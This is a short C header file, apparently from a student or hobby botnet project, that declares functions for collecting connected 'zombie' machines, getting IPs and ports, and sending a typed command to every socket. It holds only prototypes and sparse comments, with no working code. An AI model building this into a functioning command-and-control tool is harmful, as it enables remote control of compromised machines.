#ifndef BOT_NET_H
#define BOT_NET_H
#define BUFFERSIZE 256

//PRE 
//
//POST 
void discussionProcess();

//PRE
//
//POST 
//
void getPortIp(char** ip,int numberOfIp);

//PRE 
//
//POST 
void getConnectedZombie();

//PRE 'tabCommande' is a valid table to put the as a buffer for the read and stock
// the read command
//
//POST the function has read the input and wrote it in each socket in fds
//
void readWriteCommand(char* tabCommande);

#endif